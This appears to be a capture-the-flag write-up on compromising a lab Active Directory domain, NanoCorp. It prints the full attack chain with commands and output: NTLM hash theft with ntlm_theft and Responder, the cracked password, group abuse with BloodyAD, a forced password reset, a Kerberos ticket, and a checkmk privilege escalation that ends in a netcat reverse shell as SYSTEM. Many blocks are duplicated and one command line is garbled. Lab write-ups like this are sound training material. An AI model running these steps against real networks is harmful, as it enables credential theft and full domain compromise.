Add the VHOST and access the web application to find the hire part working:

We can upload a ZIP file:

Since the attack is not real, I created all possible files using ntlm_theft:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp/ntlm_theft]
└─$ python3 ntlm_theft.py -s 10.10.14.101 -f resume -g all     
/home/kali/Desktop/Labs/NanoCorp/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';

After the files were created, I created a ZIP archive. I fired up responder, uploaded the ZIP file, and obtained successful authentication from the user web_svc:

[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:8b1b3f9dedfe98bf:95B54E907E914ACBA5CE4EDEDF8FFE54:010100000000000080E24B356CA9DC01726C647ACCA0589600000000020008004D0032003100570001001E00570049004E002D005400520032004F004A0035003300470045004D00560004003400570049004E002D005400520032004F004A0035003300470045004D0056002E004D003200310057002E004C004F00430041004C00030014004D003200310057002E004C004F00430041004C00050014004D003200310057002E004C004F00430041004C000700080080E24B356CA9DC0106000400020000000800300030000000000000000000000000200000F1459E60549A1E0C68E44D78A7B361E630B7ADAA661944ED091C7CAE6C2D40400A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300031000000000000000000
[SMB] NTLMv2-SSP Client   : 10.129.243.199
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:8b1b3f9dedfe98bf:95B54E907E914ACBA5CE4EDEDF8FFE54:010100000000000080E24B356CA9DC01726C647ACCA0589600000000020008004D0032003100570001001E00570049004E002D005400520032004F004A0035003300470045004D00560004003400570049004E002D005400520032004F004A0035003300470045004D0056002E004D003200310057002E004C004F00430041004C00030014004D003200310057002E004C004F00430041004C00050014004D003200310057002E004C004F00430041004C000700080080E24B356CA9DC0106000400020000000800300030000000000000000000000000200000F1459E60549A1E0C68E44D78A7B361E630B7ADAA661944ED091C7CAE6C2D40400A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300031000000000000000000

Crack the NTLMv2 hash to retrieve the password dksehdgh712!@#:

WEB_SVC::NANOCORP:612e8e18db1d05b1:dd67a7f2cad203a92e35efed9e53c705:010100000000000080e24b356ca9dc01e333601dc06460f700000000020008004d0032003100570001001e00570049004e002d005400520032004f004a0035003300470045004d00560004003400570049004e002d005400520032004f004a0035003300470045004d0056002e004d003200310057002e004c004f00430041004c00030014004d003200310057002e004c004f00430041004c00050014004d003200310057002e004c004f00430041004c000700080080e24b356ca9dc0106000400020000000800300030000000000000000000000000200000f1459e60549a1e0c68e44d78a7b361e630b7adaa661944ed091c7cae6c2d40400a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100300031000000000000000000:dksehdgh712!@#

Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::NANOCORP:612e8e18db1d05b1:dd67a7f2cad203a9...000000

Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::NANOCORP:612e8e18db1d05b1:dd67a7f2cad203a9...000000

Now I have a valid set of domain credentials:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'      
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'      
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#

The user monitoring_svc has the ability to use WinRM on the machine:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --groups "Remote Management Users"
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.243.199  389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
LDAP        10.129.243.199  389    DC01             monitoring_svc
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --groups "Remote Management Users"
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.243.199  389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
LDAP        10.129.243.199  389    DC01             monitoring_svc

The user web_svc can add themself to the IT_SUPPORT group:

Using BloodyAD, I added the user web_svc to the IT_SUPPORT group:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ bloodyAD --host "10.129.243.199" -d "nanocorp.htb" -u "web_svc" -p 'dksehdgh712!@#' add groupMember "IT_SUPPORT" "web_svc"
[+] web_svc added to IT_SUPPORT
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ bloodyAD --host "10.129.243.199" -d "nanocorp.htb" -u "web_svc" -p 'dksehdgh712!@#' add groupMember "IT_SUPPORT" "web_svc"
[+] web_svc added to IT_SUPPORT

Now the user belongs to the IT_SUPPORT group:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --groups "IT_SUPPORT"
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.243.199  389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
LDAP        10.129.243.199  389    DC01             web_svc
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --groups "IT_SUPPORT"
LDAP        10.129.243.199  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:nanocorp.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.243.199  389    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
LDAP        10.129.243.199  389    DC01             web_svc

And the users of IT_SUPPORT group have the ForceChangePassword privilege over monitoring_svc user:

Using net, I changed the password of the user monitoring_svc:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ net rpc password "monitoring_svc" "newP@ssword2022" -U "nanocorp.htb"/"web_svc"%'dksehdgh712!@#' -S "10.129.243.199"
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ net rpc password "monitoring_svc" "newP@ssword2022" -U "nanocorp.htb"/"web_svc"%'dksehdgh712!@#' -S "10.129.243.199"

However, the STATUS_ACCOUNT_RESTRICTION restriction applies on this account:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc smb nanocorp.htb -u monitoring_svc -p 'newP@ssword2022' 
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\monitoring_svc:newP@ssword2022 STATUS_ACCOUNT_RESTRICTION
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ nxc smb nanocorp.htb -u monitoring_svc -p 'newP@ssword2022' 
SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.243.199  445    DC01             [-] nanocorp.htb\monitoring_svc:newP@ssword2022 STATUS_ACCOUNT_RESTRICTION

After several trial and errors, and resetting the box, I got it to work. I managed to obtain the TGT of the user monitoring_svc user:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ sudo ntpdate nanocorp.htb               
2026-03-01 19:20:08.779360 (-0500) +25198.341437 +/- 0.005717 nanocorp.htb 10.129.13.39 s1 no-leap
CLOCK: time stepped by 25198.341437
                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ getTGT.py 'nanocorp.htb'/'monitoring_svc:dksehdgh712!@#'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache


┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ export KRB5CCNAME=monitoring_svc.ccache
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ sudo ntpdate nanocorp.htb               
2026-03-01 19:20:08.779360 (-0500) +25198.341437 +/- 0.005717 nanocorp.htb 10.129.13.39 s1 no-leap
CLOCK: time stepped by 25198.341437
                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ getTGT.py 'nanocorp.htb'/'monitoring_svc:dksehdgh712!@#'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache


┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp]
└─$ export KRB5CCNAME=monitoring_svc.ccache

Getting initial access was the hardest as for some reason, my winrmexec kept on giving me errors. However, I am able to successfully authenticate to the DC as the user monitoring_svc at port 5986:

┌──(.venv)─(kali㉿kali)-[~/Desktop/Labs/NanoCorp/winrmexec]
└─$ sudo ntpdate 10.129.13.39                                                                                                         
2026-03-01 19:53:50.773089 (-0500) +25198.325865 +/- 0.005638 10.129.13.39 s1 no-leap
CLOCK: time stepped by 25198.325865
                                                                                                                                                                                                                         
┌──(.venv)─(kali㉿kali)-[~/Desktop/Labs/NanoCorp/winrmexec]
└─$ KRB5CCNAME=../monitoring_svc.ccache python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
'prompt_toolkit' not installed, using built-in 'readline'

[*] '-dc-ip' not specified, using NANOCORP.HTB

After enumerating the machine further, I notice there is a directory called checkmk inside the Program Files (x86) directory. This is vulnerable to Local Privilege Escalation:

PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----          3/1/2026   5:36 PM            971 exploit.ps1                                                           
-a----          3/1/2026   4:59 PM          38616 nc.exe                                                                
-a----          3/1/2026   4:57 PM          51712 RunasCs.exe                                                           
-a----          3/1/2026   5:05 PM          39558 winPEAS.bat                                                           
-a----          3/1/2026   5:07 PM       10254848 winPEAS.exe                                                           


PS C:\Temp> 
PS C:\Temp> 
PS C:\Temp> iwr -uri http.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
 
[*] Seeding trap files...
[*] Triggering repair...
PS C:\Temp> 

PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----

After following the steps, I obtained SYSTEM level shell:

┌──(kali㉿kali)-[~/Desktop/Labs/NanoCorp/winrmexec]
└─$ nc -lvnp 9000                                                       
listening on [any] 9000 ...
connect to [10.10.14.101] from (UNKNOWN) [10.129.13.39] 57199
Microsoft Windows [Version 10.0.20348.3207]

C:\Windows\system32>
